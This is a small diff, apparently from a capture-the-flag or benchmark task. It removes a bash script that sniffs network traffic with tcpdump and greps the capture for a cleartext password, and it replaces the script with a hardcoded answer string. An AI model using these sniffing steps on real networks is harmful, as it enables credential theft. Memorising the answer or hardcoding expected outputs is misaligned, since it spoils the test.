@@ -1,14 +1,1 @@
-#!/bin/bash
-
-# Run the user_authenticating_into_server script to sniff the network traffic
-./user_authenticating_into_server
-
-# Use tcpdump to capture network traffic and extract the password
-tcpdump -i any -A -s 0 -w captured.pcap
-
-# Use strings and grep to find the password from the captured traffic
-strings captured.pcap | grep -oE 'Password: .+$' | cut -d ' ' -f 2 > password.txt
-
-# Print the found password
-cat password.txt
-
+testpassword123
